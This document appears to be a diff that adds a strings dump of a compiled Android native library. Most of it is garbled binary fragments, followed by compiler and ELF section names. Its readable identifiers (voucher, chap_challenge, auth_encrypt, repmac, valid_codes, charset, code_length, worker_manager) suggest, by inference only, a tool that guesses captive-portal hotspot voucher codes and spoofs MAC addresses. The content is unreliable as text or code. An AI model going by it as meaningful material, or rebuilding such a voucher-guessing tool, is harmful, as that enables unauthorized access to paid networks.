+adata
+apost_url
+aheaders
+areq
+aresponse_text
+ae_s
+wlam_k
+aself
+ae_t
+ac_t
+arem
+wdwhwmT
+aself
+ainfo
+arepmac
+amac_req
+aself
+araw_codes
+acodes
+as_url
+avalid_codes
+aconnector
+asession
+wiav1
+asession_id
+astatus1
+astatus2
+wewfavc
+aself
+ac_t
+af_o
+al_e
+al_t
+ares
+adata
+akeys
+aexp
+am_k
+ae_t
+aself
+astatus
+amsg
+aself
+aauth
+aenc_key
+asalt
+akey_iv
+aprev
+akey
+acipher
+apadded_data
+acipher_text
+aencrypted_data
+aself
+arem_time
+ahas_limit
+a_L_R_
+aconnector
+atracker
+astart_time
+aworker
+aworker_manager
+aui_updater
+asession
+amanager_task
+aui_task
+aself
+adata
+amatch
+T	aself
+ausername
+aenc_key
+adata
+achaps
+achap_id_decoded
+achap_challenge_decoded
+aauth
+aauth_encrypt
+aself
+wfadata
+aexp
+alast_time
+aself
+ausername
+aparams
+areq
+aself
+adata
+ausername
+aauth
+apayload
+arespond
+T	aauth_mgr
+astatus
+w_achoice
+asub_choice
+acharset
+alength_input
+acode_length
+av_obj
+aself
+aexp
+alast_time
+adata
+aself
+alocalhost
+aheaders
+areq
+asession_url
+aelapsed
+aspeed
+atracker
+ahas_limit
+astart_time
+ahas_limit
+astart_time
+atracker
+aself
+ausername
+aonline_info
+adata
+aself
+areq
+asession
+asession_id
+aloop
+avoucher
+astatus
+atracker
+ahas_limit
+aself
+ahas_limit
+aself
+atracker
+asession
+aactive_tasks
+atask_to_cancel
+wtatracker
+aworker
+atracker
+aworker
+BX9p
++@y	&
+#@y*
+R	}+
+R@)W
+R	y+
+R	y+
+Rf2H
+RfBH
+RfJH
+*@9v
+&@9)
+*@96
+&@9)
+TA3G
+*@9x
++@99P
+&@9)
+6A3G
+*@97E
+&@9)
+Ra2@
+RanE
+'@9)
+&@9)
+&@9)
+Ra^C
+T(;@
+&@9)
+*@97
+&@9)
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+&@9)
+*@9v
+&@9)
+&@9)
+*@9v
+&@9)
+&@9)
+*@9v
+&@9)
+&@9)
+*@9v
+&@9)
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+&@9)
+*@9v
+&@9)
+&@9)
+*@9v
+&@9)
+&@9)
+@9IE
+*@9(
+r(ij
+&@9)
+&@9)
+T WD
+*@9hM
+r(ij
+&@9)
+6+@96
+('@9)
+T		@
+Rk)G
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+&@9)
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+Th:@
+T	D@
+Th:@
+4@?@
+6h:@
+RAc@
+6VW@
+RAc@
+4@3@
+R@7@
+Q	}+
+6h:@
+T)%@
+6@O@
+Th:@
+RAs@
+RAs@
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+R '@
+R"'@
+@9	t
+T	D@
+*j!*
+4(cB
+Th*@
+R!7@
+)jAI
+Th*@
+R!7@
+ThV@
+R(G@
+9(G@
+T)%@
+T`:@
+*@98D
+&@9)
+7(G@
+<(/@
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+T(t@
+T(x@
+T	D@
+T	D@
+Tmyi
+4(g@
+R"/@
+7H+@
+T	D@
+HCA9
+4h*@
+Rh*@
+T+yh
+4h*@
+Ri*@
+7H#@
+HCA9HZ
+T	D@
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+T	G@
+t+@9tG
+h'@9)
+Th:@
+T	D@
+RIG@
+r(ij
+9HG@
+Th*@
+RA7@
+7HG@
+&@9)
+4`*@
+RA'@
+Th*@
+RA'@
+Th*@
+RA'@
+RA7@
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+*@9w
+&@9)
+T	G@
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+T	G@
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+h*@9(
+r(ij
+h&@9)
+&@9)
+TIyi
+4	y;
+TIyi
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+@9i@
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+@9I*
+@9iv
+@9ip
+@9)F
+@9I7
+@9iL
+'@9)
+*@9H4
+r(ij
+&@9)
+;+@9
+('@9)
+*@9H
+r(ij
+&@9)
++@9;4
+'@9)
+Th:@
+Th:@
+T	D@
+*ja%
+r(ij
+&@9)
+4HCB
+Th*@
+4hV@
+9H/@
+7H/@
++@9\F
+'@9)
+@9	+
+T	D@
+6w:@
+@9I,
+T	D@
+@9I]
+6h:@
+T	G@
+@9I@
+r		@
+&@9)
+:+@9
+('@9)
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+T	G@
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+@9)=
+T	G@
+@9IY
+Tu:@
+R	}+
+h+@9
+r(ij
+h'@9)
+v+@9
+h'@9)
+Tu:@
+i*@9
+r(ij
+h&@9)
+*@9v
+&@9)
+*@9(
+r(ij
+&@9)
+'@9)
+;+@9
+('@9)
+;+@9
+('@9)
+@9il
+&@9)
+R	}+
+Tmyi
+T(7@
+4AOC
+*@9w9
+&@9)
+R	}+
+TLyi
+@9i3
+@9)@
+@9i3
+@9i;
+@9i3
+@9i?
+T	=@
+T`^@
+6`b@
+hBA9
+Th"@
+6h>@
+4hV@
+BA9(4
+RU)W
+T;{u
+B9(- 6
+T5{s
+TI{w
+6h>@
+Q*y%
+RU)W
+T({x
+RLyh
+QKy(
+"@9*
+Txz{
+"@9i
+Txz{
+"@9*
+Tx{z
+"@9I
+Tx{z
+&@9)
+&@9)
+T({w
+RJ @
+y-	@9
+-	@9
+Tj$(7
+9N	@9
+@9J!
+9N	@
+BNQAB
+K%@x_
+K%@8_
+T	U@
+(@A9
+T( @
+T)L@
+TJxi
+hBA9
+Th"@
+)	(7(
+T	U@
+hBA9
+Th"@
+)@A9?
+T) @
+R	y+
+R(y+
+R	y+
+6h>@
+6h>@
+T	=@
+R	y+
+BA9i
+Tlyj
+RU)W
+6h>@
+T	E@
+TbB@
+T`:@
+R	y+
+9)=B
+@8+%@9
+Jiz8)
+T*%@9+)@9j#
+9)=B
+9)=B
+R))G
+9)=B
+9)=B
+T`:@
+6`B@
+RS)W
+RS)W
+r*ih
+9)=B
+FB9h
+6u:@
+6`:@
+(@B9h
+9)=B
+9)=B
+86	U@
+9)=B
+9)=B
+9)=B
+9)=B
+9)=B
+9)=B
+9)=B
+9)=B
+9)=B
+9)=B
+4`:@
+Tw:@
+9)=B
+ @9)
+TH	@
+TL!@
+TH	@
+TL!@
+TKxh
+T(P@
+TMxj
+T-L@
+T,L@
+T) @
+R	}+
+'@9)
+R(}+
+BA9?
+RY)W
+R+%@9
+Jiu8)
+T*%@9+
++)@9)
+R+%@9
+Jiu8)
+T){h
+T*%@9+
++)@9)
+Tizu
+R@)W
+T)	@
+T	L@
+R@)W
+R@)W
+TKyi
+RS)W
+RS)W
+@8+%@9
+Jiu8)
+T*%@9+)@9
+r*ih
+RS)W
+(!@9
+*)@9)%@9_
+%@9.
+Ti	@
+(CA9
+T(3@
+RY)W
+T(#@
+B9(! 6
+65#D
+Tizu
+7(?@
+QKY(
+Ti&@
+7	)@
+T(q@
+ThF@
+3?)^h
+RKyk
+QHy+
+R3)W
+T	U@
+(@A9
+T( @
+iBA9?
+Ti"@
+R	}+
+Tjzi
+R	}+
+R(}+
+T	U@
+(@A9
+T( @
+iBA9?
+Ti"@
+Tjzi
+RS)W
+RS)W
+@8+%@9
+Jiz8)
+T*%@9+)@9j#
+RS)W
+	!@9
+%@9_
+%@9,
+TUky
+&@9)
+R))G
+RU)W
+R	y+
+T)}@
+T	U@
+(@A9
+T( @
+iBA9?
+Ti"@
+Tjzi
+T	U@
+(@A9
+T( @
+iBA9?
+Ti"@
+Tjzi
+(! 7(
+B9H&(6
+B9)	 7
+T	=@
+R	y+
+T`:@
+7	1@
+TJ @
+RJ @
+T_i(8
+h(8	
+_y(x
+Q	y+
+*(g@
+R(g@
+Tmyi
+TLyh
+T	U@
+(@A9
+T( @
+iBA9?
+Ti"@
+Tjzi
+QKy(
+Twj|
+T	U@
+(@A9
+T( @
+iBA9?
+Ti"@
+Tjzi
+T	U@
+(@A9
+T( @
+iBA9?
+Ti"@
+Tjzi
+R	y+
+4	y6
+T	xh
+	K-u
+	K-u
+T)1@
+T)1@
+T)1@
+T)1@
+T)1@
+4	y6
+4	y6
+T)1@
+R		@
+TKyu
+	K-u
+	K,u
+T)1@
+Tmyi
+Tmyi
+Tmyi
+Tmyi
+Tmyi
+Tmyi
++yhxJ	
+B9is07
+T;{@
+m07|
+h07T
+B9I\07
+B9	&07?
+h%@9
+T*%@9+
++)@9)
+@9e$@9
+hk8c
+@8&&@9
+Bhm81
+Td$@9f(@9
+R))G
+Q	}+
+*j!	
+*jA,
+%@9)
+)!@9
+T*%@9+
++)@9)
+Ri#@
+RU)W
+@8+%@9
+Jiv8)
+T*%@9+)@9
+I%@9
+!@9I
+T*%@9+)@9
+@8+%@9
+Jiv8)
+T*%@9+)@9
+R	}+
+Q	}+
+RZ)W
+r	ij
+Android (13989888, +pgo, +bolt, +lto, +mlgo, based on r563880c) clang version 21.0.0 (https://android.googlesource.com/toolchain/llvm-project 5e96669f06077099aa41290cdb4c5e6fa0f59349)
+Linker: LLD 21.1.8
+clang version 21.1.8
+.note.android.ident
+.dynsym
+.gnu.version
+.gnu.version_r
+.gnu.hash
+.dynstr
+.rela.dyn
+.relr.dyn
+.rela.plt
+.rodata
+.eh_frame_hdr
+.eh_frame
+.text
+.plt
+.data.rel.ro
+.fini_array
+.init_array
+.dynamic
+.got
+.got.plt
+.relro_padding
+.data
+.bss
+.comment
+.shstrtab
